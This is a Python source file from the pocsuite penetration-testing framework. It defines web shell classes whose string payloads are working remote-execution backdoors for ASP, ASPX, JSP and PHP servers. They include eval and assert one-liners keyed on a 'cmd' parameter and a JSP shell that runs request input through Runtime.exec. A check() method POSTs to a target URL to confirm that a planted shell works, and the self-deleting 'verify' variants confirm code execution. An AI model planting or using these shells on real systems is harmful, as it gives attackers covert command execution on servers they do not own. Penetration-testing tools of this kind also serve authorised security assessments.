#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""

from pocsuite.lib.request.basic import req
from pocsuite.api.utils import randomStr


class Webshell:
    _password = ''
    _content = ''
    _check_statement = ''
    _keyword = ''
    _check_data = {}

    def __init__(self, pwd='', content='', check='', keyword=''):
        if pwd:
            self._password = pwd
        if content:
            self._content = content
        if check:
            self._check_statement = check
        if keyword:
            self._keyword = keyword
        self._check_data[self._password] = self._check_statement

    def set_pwd(self, pwd):
        self._password = pwd
        self._check_data[self._password] = self._check_statement

    def get_pwd(self):
        return self._password

    def get_content(self):
        return self._content.format(self._password)

    def check(self, url):
        try:
            content = req.post(url, data=self._check_data, timeout=10).content
            return self._keyword in content
        except req.Timeout:
            return False


class VerifyShell(Webshell):

    def __init__(self, content='', keyword=''):
        Webshell.__init__(self, content=content, keyword=keyword)
        self._check_data = {}


class AspShell(Webshell):
    _keyword = randomStr(20)
    _password = 'cmd'
    _content = '<%eval request("{0}")%>'
    _check_statement = 'Response.Write(Replace("202cTEST4b70","TEST",' \
                       '"' + _keyword + '"))'
    _keyword = '202c%s4b70' % _keyword


class AspVerify(VerifyShell):
    _keyword = randomStr(20)
    _content = '<%\n' \
        'Response.Write(Replace("202cTEST4b70","TEST",' \
        '"' + _keyword + '"))\n' \
        'CreateObject("Scripting.FileSystemObject").' \
        'DeleteFile(Request.ServerVariables("Path_Translated"))\n' \
        '%>'
    _keyword = '202c%s4b70' % _keyword


class AspxShell(Webshell):
    _keyword = randomStr(20)
    _password = 'cmd'
    _content = '<%@ Page Language="Jscript"%>' \
               '<%eval(Request.Item["{0}"],"unsafe");%>'
    _check_statement = 'Response.Write("202cTEST4b70".Replace("TEST",' \
                       '"' + _keyword + '"))'
    _keyword = '202c%s4b70' % _keyword


class AspxVerify(VerifyShell):
    _keyword = randomStr(20)
    _content = '<%@ Page Language="Jscript" ContentType="text/html" ' \
        'validateRequest="false" aspcompat="true"%>\n' \
        '<%Response.Write("202cTEST4b70".Replace("TEST",' \
        '"' + _keyword + '"))%>\n' \
        '<%System.IO.File.Delete(Request.PhysicalPath);%>'
    _keyword = '202c%s4b70' % _keyword


class JspShell(Webshell):
    _keyword = randomStr(20)
    _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
        '<%@ page import="java.io.*"%>\n' \
        '<%@ page import="java.util.*"%>\n' \
        '<%\n' \
        'if (request.getParameter("check") == "1")\n' \
        '    out.println("202cTEST4b70".replace("TEST","' + _keyword + '"));\n' \
        'if (request.getParameter("{0}") != null)\n' \
        '{{\n' \
        '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
        '    OutputStream os = p.getOutputStream();\n' \
        '    InputStream in = p.getInputStream();\n' \
        '    DataInputStream dis = new DataInputStream(in);\n' \
        '    String disr = dis.readLine();\n' \
        '    while ( disr != null)\n' \
        '    {{\n' \
        '        out.println(disr);\n' \
        '        disr = dis.readLine();\n' \
        '    }}\n' \
        '\n}}' \
        '%>\n'
    _password = 'cmd'
    _check_data = {'check': '1'}
    _keyword = '202c%s4b70' % _keyword


class JspVerify(VerifyShell):
    _keyword = randomStr(20)
    _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
        '<%@ page import="java.io.*"%>\n' \
        '<%@ page import="java.util.*"%>\n' \
        '<%\n' \
        'String path=request.getRealPath("")+request.getServletPath();\n' \
        'out.println(path);\n' \
        'File d=new File(path);\n' \
        'if(d.exists()){{\n' \
        '  d.delete();\n' \
        '  }}\n' \
        '%>\n' \
        '<% out.println("202cTEST4b70".replace("TEST","' + _keyword + '"));%>'
    _keyword = '202c%s4b70' % _keyword


class PhpShell(Webshell):
    _keyword = randomStr(20)
    _password = 'cmd'
    _content = "<?php @assert($_REQUEST['{0}']);?>"
    _check_statement = 'var_dump("' + _keyword + '");'


class PhpVerify(VerifyShell):
    _keyword = randomStr(20)
    _content = "<?php var_dump('" + _keyword + "');unlink(__FILE__);?>"
